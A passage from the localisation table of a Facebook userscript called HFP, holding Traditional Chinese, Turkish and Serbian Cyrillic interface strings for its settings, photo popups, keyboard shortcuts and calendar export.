		'ConfFBFTimestamps24' : 'HFP的時間戳記採用24小時制。',
		'ConfFriendRequestCountInTitle' : '在網頁標題顯示新增好友的請求。',
		'ConfGoogleApps' : '創建Google日曆連結使其與Google的應用服務相容。',
		'ConfGoogleAppsDomain' : '域名',
		'ConfGoogleCalendar' : '新增一個生日及活動的連結 <a href="http://en.wikipedia.org/wiki/Google_Calendar" target="_blank">Google Calendar</a>.',
		'ConfGoogleLanguage' : '語言 <a href="http://en.wikipedia.org/wiki/Google_Translate" target="_blank">Google Translate</a>',
		'ConfHideApplicationStories' : '隱藏應用程式紀錄。',
		'ConfHideEventStories' : '隱藏事件紀錄。',
		'ConfHideFanStories' : '隱藏粉絲紀錄。',
		'ConfHideFriendStories' : '隱藏朋友紀錄。',
		'ConfHideGroupStories' : '隱藏團體紀錄。',
		'ConfHideLinkStories' : '隱藏連結紀錄。',
		'ConfHidePhotoStories' : '隱藏圖片紀錄。',
		'ConfHideProfilePicStories' : '隱藏個人資料的圖片紀錄。',
		'ConfHideRead' : '隱藏標記已讀得即時動態項目。',
		'ConfHideRelationshipStories' : '隱藏關聯紀錄。',
		'ConfHideStatusStories' : '隱藏身份紀錄。',
		'ConfHideVideoStories' : '隱藏短片紀錄。',
		'ConfHideWallStories' : '隱藏塗鴉牆紀錄。',
		'ConfHomeChat' : '顯示聊天部份。',
		'ConfHomeEvents' : '顯示部份活動。',
		'ConfHomeFindFriends' : '顯示朋友連結。',
		'ConfHomeLeftAlign' : '首頁向左對齊。',
		'ConfHomeLeftColumn' : '顯示左側欄位。',
		'ConfHomeLeftColumnFixed' : '向下滾動時，保持左側欄位可見。',
		'ConfHomeLink' : '在頂端的選單中，顯示首頁的連結。',
		'ConfHomePeopleYouMayKnow' : '顯示部份建議。',
		'ConfHomeNavigation' : '顯示導覽部份。',
		'ConfHomePokes' : '顯示戳一下的部份。',
		'ConfHomeProfile' : '顯示個人資料部份。',
		'ConfHomeRequests' : '顯示部份要求。',
		'ConfHomeRightColumn' : '顯示右欄。',
		'ConfHomeStretch' : '在瀏覽器中延伸首頁的寬度。',
		'ConfiCalendar' : '增加一個下載連結 <a href="http://en.wikipedia.org/wiki/ICalendar" target="_blank">iCalendar</a> file with all birthdays.',
		'ConfImport' : '如果在將來要匯入舊有設定，直接將之前的保存設定覆蓋底下的文字，然後選擇"Import（匯入）"',
		'ConfInboxCountInTitle' : '在信箱頁面顯示未讀的郵件數量',
		'ConfLogoutLink' : '在頂部的選單中加入『登出』連結。',
		'ConfNotificationCountInTitle' : '在網頁標題顯示新的通知。',
		'ConfNewTabSearch' : '使用 CTRL + Enter 搜索時，在新的頁面顯示搜尋結果。',
		'ConfPageTitle' : '移除每個頁面的 "Facebook |" 字樣。',
		'ConfPhotoPopup' : '滑鼠停於上方，自動彈出較大的圖片。',
		'ConfPopupAutoClose' : '關閉自動彈出圖片。',
		'ConfPopupSmartAutoClose' : '如果滑鼠移動到時，防止彈出圖片自動關閉。',
		'ConfPopupPosition' : '彈出圖片的顯示位置。',
		'ConfProcessInterval' : '頁面連結的間隔時間，以毫秒計算 (預設值=1000):',
		'ConfProfileLink' : '在頂端了選單中，顯示個人資料連結。',
		'ConfProfilePicPopup' : '滑鼠停於個人資料圖片上方時，自動彈出較大的圖片。',
		'ConfProtocolLinks' : '從個人資料的ID上打開聊天視窗，進入連結後即可開始交談對話。 (Google Talk, Windows Live etc).',
		'ConfSectionAbout' : '關於 HFP',
		'ConfSectionAdvanced' : '進階',
		'ConfSectionEvents' : '生日/活動',
		'ConfSectionFeeds' : '即時動態',
		'ConfSectionHomePage' : '首頁',
		'ConfSectionImportExport' : '匯入/匯出',
		'ConfSectionLiveFeed' : '即時動態',
		'ConfSectionMenu' : '選單/聊天',
		'ConfSectionOther' : '其他選項',
		'ConfSectionPageTitle' : '頁面標題',
		'ConfSectionPictures' : '圖片',
		'ConfSectionShortcuts' : '鍵盤快捷鍵',
		'ConfSecureLinks' : '強迫 Facebook 連結到 HTTPS 頁面。',
		'ConfShortcutList' : '<b>鍵盤快捷鍵</b> (大小寫區分):<br /><br /><i>從任何頁面:</i><br />&nbsp;<b>A</b> - 相本/相片<br />&nbsp;<b>B</b> - 切換好友列表 (在線好友)<br />&nbsp;<b>C</b> - HFP 設置<br />&nbsp;<b>D</b> - 生日<br />&nbsp;<b>E</b> - 活動<br />&nbsp;<b>F</b> - 朋友<br />&nbsp;<b>H</b> - 首頁<br />&nbsp;<b>I</b> - 信箱<br />&nbsp;<b>L</b> - 選擇登出連結 (按下確定後登出)<br />&nbsp;<b>N</b> - 通知<br />&nbsp;<b>P</b> - 你的個人資料<br />&nbsp;<b>R</b> - 請求<br />&nbsp;<b>S</b> - 跳到搜索欄位<br />&nbsp;<b>T</b> - 翻譯選擇的內容<br />&nbsp;<b>?</b> - 顯示HFP除錯訊息<br />&nbsp;<b>&lt;escape&gt;</b> - 使用HFP關閉彈出視窗<br /><br /><i>從首頁 (過濾)</i>:<br />&nbsp;<b>a</b> - 頁面<br />&nbsp;<b>f</b> - 即時動態<br />&nbsp;<b>g</b> - 團體<br />&nbsp;<b>l</b> - 連結<br />&nbsp;<b>n</b> - 新的動態<br />&nbsp;<b>p</b> - 相片<br />&nbsp;<b>s</b> or <b>u</b> - 更新狀態<br />&nbsp;<b>t</b> - 筆記<br />&nbsp;<b>v</b> - 影片<br /><br /><i>從個人資料</i>:<br />&nbsp;<b>i</b> - 信息<br />&nbsp;<b>p</b> - 相片<br />&nbsp;<b>w</b> - 牆<br />&nbsp;<b>x</b> - 盒子<br /><br /><i>從網頁的頁碼 (previous, next, etc)</i><br />&nbsp;<b>&lt;left arrow&gt;</b> - Previous<br />&nbsp;<b>&lt;right arrow&gt;</b> - 下一個<br />&nbsp;<b>&lt;shift&gt; + &lt;left arrow&gt;</b> - 首先 (當可以使用)<br />&nbsp;<b>&lt;shift&gt; + &lt;right arrow&gt;</b> - 最後 (當可以使用)<br /><br /><i>當瀏覽相本/相片:</i><br />&nbsp;<b>a</b> - 讀取所有縮圖 (當可以使用)<br />&nbsp;<b>b</b> - 顯示大張的圖片<br />&nbsp;<b>c</b> - 查看留言<br />&nbsp;<b>k</b> - 返回相本<br />&nbsp;<b>m</b> - 照片 (個人) 和我<br /><br /><i>查看最近上傳/標記的相片:</i><br />&nbsp;<b>a</b> or &nbsp;<b>r</b> - 最新的相本<br />&nbsp;<b>m</b> or &nbsp;<b>u</b> - 手機上傳<br />&nbsp;<b>o</b> - 我的相片<br />&nbsp;<b>p</b> - 我的相片<br />&nbsp;<b>t</b> or &nbsp;<b>f</b> - 標記的朋友',
		'ConfShortcuts' : '啟用鍵盤快捷鍵。',
		'ConfSign' : '在個人資料中顯示該人\的 生日署名 (如果他們提供了生日)。',
		'ConfTopBarFixed' : '即使向下捲動，一樣保持上方選單在螢幕上',
		'ConfTopBarHoverOpacity' : '滑鼠移至上方',
		'ConfTopBarOpacity' : '頂部選單的透明度。',
		'DownloadVideo' : '下載影片',
		'ExportICalendarFile' : '輸出 iCalendar 檔案',
		'ExportICalendarFileWarning' : '(如果你有很多的朋友的話，將要一段時間)',
		'FacebookFixerConflict' : 'Facebook Fixer現在更名為HFP。<br /><br />由於更改名稱，你需要手動從瀏覽器中卸載舊的Facebook Fixer腳本，因為兩個腳本會相互衝突。<br /><br />如果你不確定如何去移除腳本， <a %s>點擊說明部份</a>.',
		'fullAlbumLoaded' : '載入所有相本',
		'Import' : '匯入',
		'ImportConfirm' : '您確定要輸入這些設定嗎？當前的設定將會遺失。',
		'ImportFailure' : '在匯入的過程中發生錯誤。',
		'ImportSuccess' : '匯入成功。您要立即刷新頁面？',
		'Left' : '左邊',
		'LoadingAllPhotos' : '載入所有相片...',
		'loadingFullAlbum' : '載入所有相本...',
		'LoadingPic' : '載入照片中...',
		'LoadPhotosWarning' : '載入所有的照片需要較多的時間。',
		'Months' : new Array('一月','二月','三月','四月','五月','六月','七月','八月','九月','十月','十一月','十二月'),
		'ProtocolSkype' : '呼叫 %s 使用 Skype',
		'ProtocolMSN' : '聊天 %s 使用 MSN',
		'ProtocolYahoo' : '聊天 %s 使用 Yahoo 即時通',
		'ProtocolGoogle' : '聊天 %s 使用 Google Talk',
		'ReloadErrorPage' : '點擊後重試, 或是等待5秒鐘',
		'Refresh' : '刷新',
		'Remove' : '移除',
		'Right' : '右邊',
		'ShowBigPictures' : '顯示大的圖片',
		'Signs' : new Array('摩羯座','水瓶座','雙魚座','白羊座','金牛座','雙子座','巨蟹座','獅子座','處女座','天秤座','天蠍座','射手座'),
		'today' : 'today',
		'UpdateAvailable1' : 'HFP 有可用的更新。',
		'UpdateAvailable2' : '你要現在更新嗎？',
		'UpdateHomepage' : '到首頁',
		'UpdateInstall' : '馬上安裝',
		'UpdateTomorrow' : '明天提醒我',
		'yearsOld' : '%s 歲'
	},

	// Turkish - Contributed by Gökhan Gurbetoğlu (20100817)
	tr : {
		'_language' : 'Turkish',
		'AddToCalendar' : 'Takvime Ekle',
		'AddToGoogleCalendar' : 'Google Takvim\'e Ekle',
		'all' : 'tümü',
		'All' : 'Tümü',
		'AllPhotosLoaded' : 'Tüm fotoğraflar yüklendi',
		'Automatic' : 'Otomatik',
		'Birthday' : '%s Doğumgünü',
		'BookmarkAdd' : 'Yeni Yer İmi Ekle',
		'BookmarkExists' : 'Bu sayfa için zaten bir yer imi var. \n\nYer imlerine eklemek istediğiniz sayfaya gidin ve tekrar deneyin.',
		'BookmarkNamePrompt' : 'Bu yer imi için bir isim girin:\n%s',
		'BookmarksConfirmRemoval' : 'Bu yer imlerini kaldırmak istediğinize emin misiniz?',
		'BookmarksManage' : 'Yer İmlerini Yönet',
		'BookmarksRemoveSelected' : 'Seçili Yer İmlerini Kaldır',
		'Bookmarks' : 'Yer İmleri',
		'BrowserUnsupported' : 'Tarayıcınız bu özelliği desteklemiyor.',
		'CreatingFile' : 'Dosya Oluşturuluyor',
		'Close' : 'Kapat',
		'ConfigureFacebookFixer' : 'HFP\'ı Yapılandır',
		'ConfigureInstructions' : 'Bütün değişiklikler hemen kaydedilir ancak bazı değişiklikler halen açık olan sekmelerde etkisini göstermeyebilir.',
		'ConfAge' : 'Kişilerin yaşını profillerinde göster (eğer tam doğum tarihlerini belirtmişlerse).',
		'ConfAlbumComments' : 'Albümde yapılmış tüm yorumları görmek için albüm sayfalarına bir bağlantı ekle.',
		'ConfApplicationWhitelist' : 'Uygulama Beyaz Listesi - Gizlenmesini istemediğiniz uygulamaların ID numaralarını girin. Birden fazla ID için aralara boşluk bırakın.',
		'ConfAutoBigAlbumPictures' : 'Büyük albüm resimlerini sayfa açıldığında otomatik olarak göster.',
		'ConfAutoLoadFullAlbum' : 'Bir albümdeki tüm küçük resimleri otomatik olarak tek sayfada yükle.',
		'ConfAutoLoadTaggedPhotos' : 'Tüm etiketlenmiş fotoğraflar için küçük resimleri otomatik olarak tek sayfada yükle (kişilerin profilindeki fotoğraflar sekmesi)',
		'ConfAutoReadMore' : '"Devamını gör" bağlantılarına otomatik olarak tıkla.',
		'ConfBigAlbumPictures' : 'Albüm sayfalarına bütün resimlerin büyük sürümlerini tek sayfada göstermek için bir bağlantı ekle.',
		'ConfBookmarks' : 'Üst menü çubuğuna bir Yer İmleri alt menüsü ekle.',
		'ConfBottomBarHoverOpacity' : 'Fare üstüne geldiğinde',
		'ConfBottomBarOpacity' : 'Alt menü çubuğu şeffaflığı',
		'ConfCalendarBirthDate' : 'Etkinlik ayrıntıları kişinin doğumgününü içersin.',
		'ConfCalendarFullName' : 'Doğumgünleri için kişinin tam adını kullan (sadece ilk adını kullanmak yerine).',
		'ConfChatDifferentiate' : 'Çevrimiçi ve boştaki arkadaşları ayırt etmek için kalın ve italik yazıtipi kullan.',
		'ConfChatHideIdle' : 'Boştaki arkadaşları gizle.',
		'ConfDelayPopupPics' : 'Açılır pencerede resimleri göstermeden önce kısa bir gecikme zamanı ekle.',
		'ConfDelayPopupPicsTimeout' : 'Açılır pencerede resimleri göstermeden önceki gecikme, milisaniye olarak (varsayılan=500):',
		'ConfDownloadVideo' : 'Video sayfalarındaki videoları indirmek için bir bağlantı ekle. (Bir <a href="http://en.wikipedia.org/wiki/Flash_Video#FLV_players" target="_blank">FLV oynatıcı</a>\'ya ihtiyacınız olabilir)',
		'ConfErrorPageReload' : 'Uygulama hata sayfalarını 5 saniye sonra otomatik olarak yenile.',
		'ConfExport' : 'Ayarlarınızı dışa aktarmak için aşağıdaki metni kopyalayın ve bir dosyaya kaydedin.',
		'ConfExternalPopup' : 'Harici sitelerdeki fotoğrafların büyük sürümünü göster. <sup>beta</sup>',
		'ConfFacebookHFPLanguage' : 'HFP\'ın Dili',
		'ConfFacebookTimestamps' : 'Facebook\'un zaman etiketlerini göster (örn. "3 saat önce").',
		'ConfFBFTimestamps' : 'Facebook\'un zaman etiketlerinin ardından HFP zaman etiketlerini ekle (örn. "11:45").',
		'ConfFBFTimestamps24' : 'HFP zaman etiketlerini 24-saat biçiminde göster',
		'ConfFriendRequestCountInTitle' : 'Sayfa başlığında yeni arkadaşlık isteklerinin sayısını göster.',
		'ConfGoogleApps' : 'Google Apps ile uyumlu Google Takvim bağlantıları oluştur.',
		'ConfGoogleAppsDomain' : 'Etki Alanı',
		'ConfGoogleCalendar' : '<a href="http://tr.wikipedia.org/wiki/Google_Takvim" target="_blank">Google Takvim</a>\'e doğumgünü ve etkinlikler ekleyebilmek için bağlantıları oluştur.',
		'ConfGoogleLanguage' : '<a href="http://tr.wikipedia.org/wiki/Google_%C3%87eviri" target="_blank">Google Çeviri</a> için dil',
		'ConfHideApplicationStories' : 'Uygulama haberlerini gizle.',
		'ConfHideEventStories' : 'Etkinlik haberlerini gizle.',
		'ConfHideFacebookCountInTitle' : 'Facebook\'un yeni mesaj sayısı gösterimini gizle.',
		'ConfHideFriendStories' : 'Arkadaşlık haberlerini gizle.',
		'ConfHideGroupStories' : 'Grup haberlerini gizle.',
		'ConfHideLikeStories' : 'Beğenme haberlerini gizle.',
		'ConfHideLinkStories' : 'Bağlantı haberlerini gizle.',
		'ConfHideNoteStories' : 'Not haberlerini gizle.',
		'ConfHidePhotoStories' : 'Fotoğraf haberlerini gizle.',
		'ConfHideProfilePicStories' : 'Profil resmi haberlerini gizle.',
		'ConfHideRead' : 'Canlı haberlerdeki okundu olarak işaretlenmiş öğeleri gizle.',
		'ConfHideRelationshipStories' : 'İlişki haberlerini gizle.',
		'ConfHideStatusStories' : 'Durum haberlerini gizle.',
		'ConfHideVideoStories' : 'Video haberlerini gizle.',
		'ConfHideWallStories' : 'Duvar hikayelerini gizle.',
		'ConfHomeBeta' : 'Facebook Ön Gösterim bölmesini göster.',
		'ConfHomeChat' : 'Sohbet bölmesini göster.',
		'ConfHomeEvents' : 'Etkinlik bölmesini göster.',
		'ConfHomeFindFriends' : 'Arkadaşlarınla Bağlantı Kur bölmesini göster.',
		'ConfHomeLeftAlign' : 'Ana sayfa içeriğini sola yasla.',
		'ConfHomeLeftColumn' : 'Sol sütunu göster.',
		'ConfHomeLeftColumnFixed' : 'Sayfa aşağı kaydırılsa bile sol sütunu görünür tut.',
		'ConfHomeLink' : 'Üst menü çubuğunda Ana Sayfa bağlantısını göster.',
		'ConfHomeNavigation' : 'Dolaşma bölmesini göster.',
		'ConfHomePokes' : 'Dürtme bölmesini göster.',
		'ConfHomeProfile' : 'Profil bölmesini göster.',
		'ConfHomeRecommendations' : 'Tavsiyeleri göster (Tanıyor Olabileceğin Kişiler, Tavsiye Edilen Sayfalar, vs.).',
		'ConfHomeRequests' : 'İstekler bölmesini göster.',
		'ConfHomeRightColumn' : 'Sağ sütunu göster.',
		'ConfHomeStretch' : 'Ana sayfayı tarayıcının genişliğine sığacak şekilde uzat.',
		'ConfHomeStretchComments' : 'Ana sayfadaki yorumları uzat.',
		'ConfiCalendar' : 'Bütün doğumgünlerini içeren bir <a href="http://en.wikipedia.org/wiki/ICalendar" target="_blank">iCalendar</a> dosyası indirmek için bağlantıları ekle.',
		'ConfImport' : 'İleride ayarlarınızı içe aktarmak için, daha önce kaydettiğiniz metni aşağıdaki metnin yerine yapıştırın ve "İçe Aktar"a tıklayın.',
		'ConfInboxCountInTitle' : 'Sayfa başlığında gelen kutusundaki okunmamış mesaj sayısını göster.',
		'ConfLogoutLink' : 'Üst menü çubuğuna bir çıkış bağlantısı ekle.',
		'ConfNotificationCountInTitle' : 'Sayfa başlığında bildirimlerin sayısını göster.',
		'ConfNewTabSearch' : 'CTRL + Enter basarak arama yapıldığında arama sonuçlarını yeni bir sekmede/pencerede aç.',
		'ConfPageTitle' : 'Bütün sayfaların başlığından "Facebook |" yazısını kaldır.',
		'ConfPhotoPopup' : 'Fareyle üstüne gelindiğinde fotoğrafların büyük sürümlerini göster.',
		'ConfPopupAutoClose' : 'Açılan pencere resimlerini otomatik olarak kapat.',
		'ConfPopupSmartAutoClose' : 'Açılan pencere resimlerinin fare üzerindeyken otomatik olarak kapanmasını engelle.',
		'ConfPopupPosition' : 'Açılan pencere resimlerinin konumu',
		'ConfProcessInterval' : 'Sayfayı işlemek için zaman aralığı, milisaniye olarak (varsayılan=1000):',
		'ConfProfileLink' : 'Üst menü çubuğunda Profil bağlantısını göster.',
		'ConfProfilePicPopup' : 'Fareyle üstüne gelindiğinde profil resimlerinin büyük sürümlerini göster',
		'ConfProtocolLinks' : 'Profillerdeki anlık ileti adreslerini anında iletişim kurulabilecek bağlantılara dönüştür (Google Talk, Windows Live, vb.).',
		'ConfSectionAbout' : 'HFP Hakkında',
		'ConfSectionAdvanced' : 'Gelişmiş',
		'ConfSectionEvents' : 'Doğumgünleri/Etkinlikler',
		'ConfSectionImportExport' : 'İçe/Dışa Aktar',
		'ConfSectionFeeds' : 'Kaynaklar',
		'ConfSectionHomePage' : 'Ana Sayfa',
		'ConfSectionLiveFeed' : 'Canlı Haberler',
		'ConfSectionMenu' : 'Menüler/Sohbet',
		'ConfSectionOther' : 'Diğer Seçenekler',
		'ConfSectionPageTitle' : 'Sayfa Başlığı',
		'ConfSectionPictures' : 'Resimler',
		'ConfSectionShortcuts' : 'Klavye Kısayolları',
		'ConfSecureLinks' : 'Facebook bağlantılarını HTTPS sayfalarını kullanmaya zorla.',
		'ConfShortcutList' : '<b>Klavye Kısayolları</b> (büyük/küçük harf duyarlı):<br /><br /><i>Herhangi bir sayfadan:</i><br /> <b>A</b> - Albümler/fotoğraflar<br /> <b>B</b> - Arkadaş listesini aç/kapa (çevrimiçi arkadaşlar)<br /> <b>C</b> - HFP yapılandırması<br /> <b>D</b> - Doğumgünleri<br /> <b>E</b> - Etkinlikler<br /> <b>F</b> - Arkadaşlar<br /> <b>H</b> - Ana Sayfa<br /> <b>I</b> - Gelen Kutusu<br /> <b>L</b> - Çıkış bağlantısını seç (çıkış yapmak için bundan sonra Enter\'a basın)<br /> <b>N</b> - Bildirimler<br /> <b>P</b> - Profiliniz<br /> <b>R</b> - İstekler<br /> <b>S</b> - Arama alanına git<br /> <b>T</b> - Seçili metni tercüme et<br /> <b>?</b> - HFP hata ayıklama bilgisini göster<br /> <b><escape></b> - HFP tarafından açılmış pencereleri kapat<br /><br /><i>Ana sayfadan (filtreler):</i><br /> <b>a</b> - Sayfalar<br /> <b>f</b> - Canlı Haberler<br /> <b>g</b> - Gruplar<br /> <b>l</b> - Bağlantılar<br /> <b>n</b> - Haber Kaynağı<br /> <b>p</b> - Fotoğraflar<br /> <b>s</b> veya <b>u</b> - Durum güncellemeleri<br /> <b>t</b> - Notlar<br /> <b>v</b> - Videolar<br /><br /><i>Profil sayfalarından:</i><br /> <b>i</b> - Bilgi<br /> <b>p</b> - Fotoğraflar<br /> <b>w</b> - Duvar<br /> <b>x</b> - Kutular<br /><br /><i>Numaralandırılmış sayfalardan (önceki, sonraki, vb.):</i><br /> <b><sol ok></b> - Önceki<br /> <b><sağ ok></b> - Sonraki<br /> <b><shift> + <sol ok></b> - İlk (eğer mevcutsa)<br /> <b><shift> + <sağ ok></b> - Son (eğer mevcutsa)<br /><br /><i>Albümleri/fotoğrafları görüntülerken:</i><br /> <b>a</b> - Tüm küçük resimleri yükle (eğer mevcutsa)<br /> <b>b</b> - Büyük resimleri göster<br /> <b>c</b> - Yorumları göster<br /> <b>k</b> - Albüme geri dön<br /> <b>m</b> - (Kişi) ve benim fotoğraflarım<br /><br /><i>Yakın zamanlardaki albümleri ve yüklenmiş/etiketlenmiş fotoğrafları görüntülerken:</i><br /> <b>a</b> veya  <b>r</b> - Yakın Zamandaki Albümler<br /> <b>m</b> veya  <b>u</b> - Mobil yüklemeler<br /> <b>o</b> - Benim olduğum fotoğraflar<br /> <b>p</b> - Fotoğraflarım<br /> <b>t</b> veya  <b>f</b> - Etiketlenmiş arkadaşlar',
		'ConfShortcuts' : 'Klavye kısayollarını etkinleştir.',
		'ConfSign' : 'Profillerde kişilerin burçlarını göster (eğer doğum tarihlerini belirtmişlerse).',
		'ConfTopBarFixed' : 'Sayfa aşağı kaydırılsa bile üst menü çubuğunu ekranda tut.',
		'ConfTopBarHoverOpacity' : 'Fare üstüne geldiğinde',
		'ConfTopBarOpacity' : 'Üst menü çubuğu şeffaflığı',
		'DownloadVideo' : 'Videoyu İndir',
		'ExportICalendarFile' : 'iCalendar dosyası aktar',
		'ExportICalendarFileWarning' : '(Eğer çok arkadaşınız varsa bu biraz uzun sürebilir)',
		'FacebookFixerConflict' : 'HFP\'ın yeni adı artık HFP. İsim değişikliğinden dolayı HFP\'ı tarayıcınızdan kaldırmanız gerekiyor, yoksa bu iki script birbiriyle uyuşmazlık sorunları çıkaracaktır. Eğer bir userscript\'i nasıl kaldıracağınızdan emin değilseniz <a %s>buraya tıklayarak öğrenebilirsiniz</a>.',
		'fullAlbumLoaded' : 'bütün albüm yüklendi',
		'Import' : 'İçe Aktar',
		'ImportConfirm' : 'Bu ayarları içe aktarmak istediğinize emin misiniz?\nMevcut ayarlarınız silinecek.',
		'ImportFailure' : 'Ayarlarınızı içe aktarmaya çalışırken bir hata oluştu.',
		'ImportSuccess' : 'İçe aktarma tamamlandı. Sayfayı yenilemek ister misiniz?',
		'Left' : 'Sol',
		'LoadingAllPhotos' : 'Tüm fotoğraflar yükleniyor...',
		'loadingFullAlbum' : 'tüm albüm yükleniyor...',
		'LoadingPic' : 'Resim Yükleniyor...',
		'LoadPhotosWarning' : 'Tüm fotoğrafları yüklemek uzun zaman alabilir',
		'Months' : new Array('Ocak','Şubat','Mart','Nisan','Mayıs','Haziran','Temmuz','Ağustos','Eylül','Ekim','Kasım','Aralık'),
		'ProtocolSkype' : '%s kişisini Skype kullanarak ara',
		'ProtocolMSN' : '%s ile Windows Live kullanarak sohbet et',
		'ProtocolYahoo' : '%s ile Yahoo Messenger kullanarak sohbet et',
		'ProtocolGoogle' : '%s ile Google Talk kullanarak sohbet et',
		'ReloadErrorPage' : 'Yeniden denemek için tıklayın, ya da 5 saniye bekleyin',
		'Refresh' : 'Yenile',
		'Remove' : 'Kaldır',
		'Right' : 'Sağ',
		'ShowBigPictures' : 'Büyük Resimleri Göster',
		'Signs' : new Array('Oğlak','Kova','Balık','Koç','Boğa','İkizler','Yengeç','Aslan','Başak','Terazi','Akrep','Yay'),
		'today' : 'bugün',
		'Translators' : 'Çevirenler',
		'UpdateAvailable1' : 'HFP için bir güncelleme mevcut',
		'UpdateAvailable2' : 'Şimdi güncellemek ister misiniz?',
		'UpdateHomepage' : 'Ana sayfaya git',
		'UpdateInstall' : 'Şimdi kur',
		'UpdateTomorrow' : 'Yarın hatırlat',
		'ViewAlbumComments' : 'Albüm Yorumlarını Göster',
		'yearsOld' : '%s yaşında'
	},

	// Serbian (Cyrillic) - Contributed by Горштак (20100817)
	sr_rs : {
		'_language' : 'Serbian (Cyrillic)',
		'AddToCalendar' : 'Додај у календар',
		'AddToGoogleCalendar' : 'Додај у Google календар',
		'all' : 'све',
		'All' : 'Све',
		'AllPhotosLoaded' : 'Све фотографије су учитане',
		'Automatic' : 'Аутоматски',
		'Birthday' : 'Рођендан корисника %s',
		'BookmarkAdd' : 'Додај нову забелешку',
		'BookmarkExists' : 'Ова страница је већ додата у забелешке.\n\nИдите на страницу коју желите да додате и покушајте поново.',
		'BookmarkNamePrompt' : 'Унесите назив ове забелешке:\n%s',
 		'BookmarksConfirmRemoval' : 'Да ли сте сигурни да желите да уклоните ове забелешке?',
 		'BookmarksManage' : 'Уреди забелешке',
 		'BookmarksRemoveSelected' : 'Уклони изабране забелешке',
		'Bookmarks' : 'Забелешке',
		'BrowserUnsupported' : 'Ваш претраживач не подржава ову опцију.',
		'CreatingFile' : 'Датотека се израђује',
		'Close' : 'Затвори',
		'ConfigureFacebookFixer' : 'Подеси HFP',
		'ConfigureInstructions' : 'Све измене се се одмах памте, али понекад је потребно освежити отворене странице да би измене деловале.',
		'ConfAge' : 'Прикажи узраст особе на профилу (уколико је наведен пун датум пођења).',
 		'ConfAlbumComments' : 'Додај везу на страницу албума којом би се приказали сви коментари албума.',
		'ConfApplicationWhitelist' : 'Списак дозвољених апликација - Унесите ознаку апликације како бисте спречили њено сакривање. Раздвојте ознаке размаком.',
		'ConfAutoBigAlbumPictures' : 'Аутоматски прикажи веће фотографије из албума када се страница отвори.',
		'ConfAutoLoadFullAlbum' : 'Аутоматски, на једној страници, учитај сличице свих фотографија из албума.',
		'ConfAutoLoadTaggedPhotos' : 'Аутоматски, на једној страници, учитај сличице свих означених фотографија (на картици "Фотографије" унутар профила).',
		'ConfAutoReadMore' : 'Аутоматски кликни на везу "старије".',
		'ConfBigAlbumPictures' : 'На страници албума додај везу за приказивање већих сличица свих фотографија са те странице.',
		'ConfBookmarks' : 'Додај подмени "Забелешке" на горњу траку са менијима.',
		'ConfBottomBarHoverOpacity' : 'Приликом преласка мишем',
		'ConfBottomBarOpacity' : 'Провидност доње траке са менијима',
		'ConfCalendarBirthDate' : 'Укључи датум рођења корисника у детаљима догађаја.',
		'ConfCalendarFullName' : 'Додај и презиме корисника у наслову рођендана.',
		'ConfChatDifferentiate' : 'Означи доступне пријатеље подебљаним словима а неактивне косим словима.',
		'ConfChatHideIdle' : 'Сакриј неактивне пријатеље.',
		'ConfDelayPopupPics' : 'Укључи кратак застој пре приказивања увећаних слика.',
		'ConfDelayPopupPicsTimeout' : 'Застој пре приказивања увећаних слика, у милисекундама (подразумевано=500):',
		'ConfDownloadVideo' : 'Додај везу за преузимање видео снимка са странице за видео. (Можда ће вам требати <a href="http://en.wikipedia.org/wiki/Flash_Video#FLV_players" target="_blank">FLV player</a>)',
		'ConfErrorPageReload' : 'Аутоматско поновно учитавање странице након 5 секунди, у случају грешке.',
		'ConfExport' : 'Да бисте извезли своја подешавања, копирајте текст који следи и сачувајте га у датотеку.',
		'ConfExternalPopup' : 'Прикажи увећане слике фотографија са спољашњих страница. <sup>бета</sup>',
		'ConfFacebookHFPLanguage' : 'Језик HFP-а',
		'ConfFacebookTimestamps' : 'Прикажи Фејсбук време (нпр. "пре 3 сата").',
		'ConfFBFTimestamps' : 'Додај HFP време после Фејсбук времена (нпр. "11:45").',
		'ConfFBFTimestamps24' : 'Прикажи HFP времена у 24-часовном облику.',
		'ConfFriendRequestCountInTitle' : 'Прикажи број захтева за пријатељство у наслову странице.',
		'ConfGoogleApps' : 'Направи везе за Google календар, погодне за Google ове апликације.',
		'ConfGoogleAppsDomain' : 'Домен',
		'ConfGoogleCalendar' : 'Додај везе за додавање рођендана и догађаја у <a href="http://en.wikipedia.org/wiki/Google_Calendar" target="_blank">Google календар</a>.',
		'ConfGoogleLanguage' : 'Језик за <a href="http://en.wikipedia.org/wiki/Google_Translate" target="_blank">Google преводилац</a>',
		'ConfHideApplicationStories' : 'Сакриј обавештења о апликацијама.',
		'ConfHideEventStories' : 'Сакриј обавештења о догађајима.',
 		'ConfHideFacebookCountInTitle' : 'Сакриј Фејсбуков број нових примљених порука.',
		'ConfHideFriendStories' : 'Сакриј обавештења о пријатељствима.',
		'ConfHideGroupStories' : 'Сакриј обавештења о групама.',
 		'ConfHideLikeStories' : 'Сакриј обавештења о "допада ми се" ставкама.',
		'ConfHideLinkStories' : 'Сакриј обавештења о везама.',
		'ConfHideNoteStories' : 'Сакриј обавештења о записима.',
		'ConfHidePhotoStories' : 'Сакриј обавештења о фотографијама.',
		'ConfHideProfilePicStories' : 'Сакриј обавештења о сликама на профилу.',
		'ConfHideRead' : 'У најновијим дешавањима сакриј ставке које су означене као прочитане.',
		'ConfHideRelationshipStories' : 'Сакриј обавештења о статусима везе.',
		'ConfHideStatusStories' : 'Сакриј промене статуса.',
		'ConfHideVideoStories' : 'Сакриј обавештења о видео записима.',
		'ConfHideWallStories' : 'Сакриј обавештења са зида.',
 		'ConfHomeBeta' : 'Прикажи одељак са Фејсбуковим најавама.',
		'ConfHomeChat' : 'Прикажи одељак са ћаскањем.',
		'ConfHomeEvents' : 'Прикажи одељак са догађајима.',
		'ConfHomeFindFriends' : 'Прикажи "Повежи се са" одељак.',
		'ConfHomeLeftAlign' : 'Поравнај садржај почетне странице по левој страни.',
		'ConfHomeLeftColumn' : 'Прикажи леву колону.',
		'ConfHomeLeftColumnFixed' : 'Нека лева колона буде видљива и приликом померања странице на доле.',
		'ConfHomeLink' : 'Прикажи везу за Почетну страницу на горњој траци са менијима.',
		'ConfHomeNavigation' : 'Прикажи одељак за навигацију.',
		'ConfHomePokes' : 'Прикажи "Боцкање" одељак.',
		'ConfHomeProfile' : 'Прикажи "Профил" одељк.',
 		'ConfHomeRecommendations' : 'Прикажи препоруке (Особе које можда познајеш, Препоручене странице итд.).',
		'ConfHomeRequests' : 'Прикажи "Захтеви" одељак.',
		'ConfHomeRightColumn' : 'Прикажи десну колону.',
